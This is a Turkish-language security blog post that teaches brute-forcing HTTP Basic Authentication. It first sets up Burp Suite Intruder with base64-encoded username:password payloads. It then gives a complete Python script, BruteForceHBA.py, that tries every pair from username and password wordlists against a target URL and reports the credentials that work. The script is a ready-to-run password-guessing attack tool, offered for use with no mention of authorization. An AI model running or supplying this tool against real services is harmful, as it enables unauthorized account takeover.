<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.1"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>HTTP Basic Authentication Brute-Force - musana</title><meta description="Burp Suite İle HTTP Basic Auth Brute ForceHTTP Basic Authentication, kimlik bilgilerini http paketine eklediği Authentication başlığında aşağıdaki formata uygun şekilde tutmaktadır.   1Authorization:"><meta property="og:type" content="blog"><meta property="og:title" content="Cyber Security"><meta property="og:url" content="https://musana.net/"><meta property="og:site_name" content="musana.net"><meta property="og:description" content="Burp Suite İle HTTP Basic Auth Brute ForceHTTP Basic Authentication, kimlik bilgilerini http paketine eklediği Authentication başlığında aşağıdaki formata uygun şekilde tutmaktadır.   1Authorization:"><meta property="og:locale" content="en_US"><meta property="og:image" content="og:/img/logos.svg"><meta property="article:published_time" content="2017-01-14T19:30:32.000Z"><meta property="article:modified_time" content="2020-08-16T20:18:55.214Z"><meta property="article:author" content="Musa ŞANA"><meta property="article:tag" content="python"><meta property="article:tag" content="authentication"><meta property="article:tag" content="basic auth"><meta property="article:tag" content="brute-force"><meta property="article:tag" content="burp"><meta property="article:tag" content="burp suite"><meta property="article:tag" content="HTTPBasicAuth"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="og:/img/logos.svg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://musana.net/2017/01/14/HTTP-Basic-Authentication-Brute-Force/"},"headline":"musana","image":["https://musana.net/2017/01/14/HTTP-Basic-Authentication-Brute-Force/thumbnail.png"],"datePublished":"2017-01-14T19:30:32.000Z","dateModified":"2020-08-16T20:18:55.214Z","author":{"@type":"Person","name":"Musa ŞANA"},"description":"Burp Suite İle HTTP Basic Auth Brute ForceHTTP Basic Authentication, kimlik bilgilerini http paketine eklediği Authentication başlığında aşağıdaki formata uygun şekilde tutmaktadır.   1Authorization:"}</script><link rel="canonical" href="https://musana.net/2017/01/14/HTTP-Basic-Authentication-Brute-Force/"><link rel="icon" href="/img/logos.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/xt256.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logos.svg" alt="musana" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/musana"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="thumbnail" src="/2017/01/14/HTTP-Basic-Authentication-Brute-Force/thumbnail.png" alt="HTTP Basic Authentication Brute-Force"></span></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2017-01-14T19:30:32.000Z" title="2017-01-14T19:30:32.000Z">2017-01-14</time><span class="level-item"> Musa ŞANA </span><span class="level-item"><a class="link-muted" href="/categories/Web-Security/">Web Securıty</a></span></div></div><h1 class="title is-3 is-size-4-mobile">HTTP Basic Authentication Brute-Force</h1><div class="content"><h4 id="Burp-Suite-Ile-HTTP-Basic-Auth-Brute-Force"><a href="#Burp-Suite-Ile-HTTP-Basic-Auth-Brute-Force" class="headerlink" title="Burp Suite İle HTTP Basic Auth Brute Force"></a>Burp Suite İle HTTP Basic Auth Brute Force</h4><p>HTTP Basic Authentication, kimlik bilgilerini http paketine eklediği Authentication başlığında aşağıdaki formata uygun şekilde tutmaktadır.  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic base64encode(&quot;username:password&quot;)</span><br></pre></td></tr></table></figure>

<p>Brute force yaparken bizim değişken alanımız http headerlerında bulunan <code>Authorization: Basic</code> kısmından sonraki ifade olan base64 ile encode edilmiş kısım olacaktır.  </p>
<a id="more"></a>
<p>İlk olarak burp suite proxy moda aldıktan sonra test amaçlı bir kimlik bilgisi girilir.    </p>
<img src="/2017/01/14/HTTP-Basic-Authentication-Brute-Force/http-basic.png" class="" title="http basic auth"> 

<p>İsteğimiz burp tarafından yakalandıktan sonra <code>Send to Intruder</code> diyerek intruder sekmesine gönderiyoruz.   </p>
<img src="/2017/01/14/HTTP-Basic-Authentication-Brute-Force/burp-proxy.png" class="" title="burp proxy"> 

<p>Bu bölümde ise değişken olan alanımızı seçtikten sonra yan tarafta bulunan <code>Add to §</code> diyerek değişken alanımızı belirtiyoruz.    </p>
<img src="/2017/01/14/HTTP-Basic-Authentication-Brute-Force/add-to-s.png" class="" title="add to s"> 

<p>Bundan sonra sonra değişken alanımıza verilecek değerleri belirtmemiz gerekir. Bunun için <strong>Payloads</strong> sekmesine geliyoruz.  </p>
<img src="/2017/01/14/HTTP-Basic-Authentication-Brute-Force/general.png" class="" title="general"> 

<p>Yukarıdaki resimde işaretli olan alanlara değinecek olursak;  </p>
<p><code>Payload Sets</code> kullanacağımız payload kümesinin türünü ifade etmektedir. Biz burda custom olanı seçerek değerleri dışardan gireceğimizi ifade ediyoruz.  </p>
<p><code>Payload Options</code> bölümünde ise hazır bir wordlisti load edebileceğimiz gibi, manuel değerler girerek de mini bir wordlist oluşturulabilir. İşlemin uzun sürmemesi adına manuel olarak bir kaç kullanıcı adı ve parola değeri giriyorum. Seçenekelerimiz marker ile işaretlenen kısımlar gibi olmalıdır.  </p>
<p><code>position: 1</code> ifadesi username değerlerimizi ifade etmektedir. Parola değerlerini de eklemek için position değerini 2 yaparak listeye manuel olarak parola değerleri giriniz. (veya parola wordlisti yükleyebilirsiniz.)  </p>
<p><code>Seperator for position 1</code> kısmında seperate karakterimizi <strong>:</strong> nokta seçmemizin nedeni kimlik bilgilerinin <em>username:password</em> formatında gönderilmesinden dolayı.  </p>
<p><code>Payload Processing</code> bölümünde ise değişken alanımızdaki değerlerin base64 ile encode edilip gönderildiğinden, <code>add</code> diyerek encode seçeneğini base64 olarak belirtiyoruz.  </p>
<p>Son olarak base64 encode işlemi 4’ün katlarına tamamlamak için sona konulan <code>=</code> ifadelerini encode etmesini engellemek için <code>payload encoding</code> kısmından <code>=</code> işaretini kaldırarak payladın doğru bir şekilde gönderilmesini sağlıyoruz.  </p>
<img src="/2017/01/14/HTTP-Basic-Authentication-Brute-Force/payload-process.png" class="" title="payload-process">

<p>Bu adımları sorunsuz bir şekilde uyguladıktan sonra <strong>attack</strong> diyerek sadece 200 dönen cevaba bakmamız gerekir.(Başarısız olanlar için 401 durum kodu dönmektedir.)  </p>
<img src="/2017/01/14/HTTP-Basic-Authentication-Brute-Force/result.png" class="" title="result">

<p><strong>TRICK:</strong> Ayrıca <code>options</code> sekmesinde thread sayısını artırma, yeniden bağlanma, başlama zamanı gibi çesitli seçenekleri de ayarlayabilirsiniz.  </p>
<p>Bu işlemi burp dışında pythonda bulunan request kütüphanesi ile yapmak isterseniz aşağıdaki ufak tool’da işinizi görecektir.</p>
<h4 id="Request-Kutuphanesiyle-HTTP-Basic-Auth-Brute-Force"><a href="#Request-Kutuphanesiyle-HTTP-Basic-Auth-Brute-Force" class="headerlink" title="Request Kütüphanesiyle HTTP Basic Auth Brute Force"></a>Request Kütüphanesiyle HTTP Basic Auth Brute Force</h4><figure class="highlight python"><figcaption><span>BruteForceHBA.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author: Musa ŞANA</span></span><br><span class="line"><span class="comment"># Date: 29.10.2017</span></span><br><span class="line"><span class="comment"># Usage: python3 BruteForceHBA.py http://localhost/http-basic-auth username.txt password.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(*argv)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(argv) &lt; <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">"\nUSAGE: BruteForceHBA.py &lt;url&gt; &lt;username.txt&gt; &lt;password.txt&gt;\n"</span>)</span><br><span class="line">        quit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        attack(argv[<span class="number">0</span>], username(argv[<span class="number">1</span>]), password(argv[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">username</span><span class="params">(usernameList)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(usernameList , <span class="string">"r"</span>) <span class="keyword">as</span> u:</span><br><span class="line">        username = u.read().splitlines()</span><br><span class="line">    <span class="keyword">return</span> username</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">password</span><span class="params">(passwordList)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(passwordList, <span class="string">"r"</span>) <span class="keyword">as</span> p:</span><br><span class="line">        password = p.read().splitlines()</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(url, username, password)</span>:</span></span><br><span class="line">    print(<span class="string">"TARGET: "</span>+url)</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> passw <span class="keyword">in</span> password:</span><br><span class="line">            req = requests.post(url, auth=HTTPBasicAuth(user, passw))</span><br><span class="line">            <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">"-"</span>*<span class="number">60</span>, <span class="string">"\n[!] FOUND - Username: "</span>+user+<span class="string">" Password: "</span>+passw, <span class="string">"\n"</span>, <span class="string">"-"</span>*<span class="number">60</span>)</span><br><span class="line">                quit()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"[*] "</span>, req.status_code, <span class="string">"Username: "</span>+user+<span class="string">" - Password: "</span>+passw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main(*argv[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>

<p>Güvenli günler.</p>
</div><div class="article-tags size-small mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/python/">python</a><a class="link-muted mr-2" rel="tag" href="/tags/authentication/">authentication</a><a class="link-muted mr-2" rel="tag" href="/tags/basic-auth/">basic auth</a><a class="link-muted mr-2" rel="tag" href="/tags/brute-force/">brute-force</a><a class="link-muted mr-2" rel="tag" href="/tags/burp/">burp</a><a class="link-muted mr-2" rel="tag" href="/tags/burp-suite/">burp suite</a><a class="link-muted mr-2" rel="tag" href="/tags/HTTPBasicAuth/">HTTPBasicAuth</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=5f37aea1d0ad230012027a61&amp;product=sop" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2016/10/23/Python-Requests-Kutuphanesi/"><span class="level-item">Python Requests Kütüphanesi</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
            this.page.url = 'https://musana.net/2017/01/14/HTTP-Basic-Authentication-Brute-Force/';
            this.page.identifier = '2017/01/14/HTTP-Basic-Authentication-Brute-Force/';
        };
        (function() {
            var d = document, s = d.createElement('script');  
            s.src = '//' + '0xmusana' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();</script></div></div></div><!--!--><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logos.svg" alt="musana" height="28"></a><p class="size-small"><span>&copy; 2021 Musa ŞANA</span></p><p class="size-small">Powered by Hexo &amp; Icarus</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/musana"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'https://musana.net',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>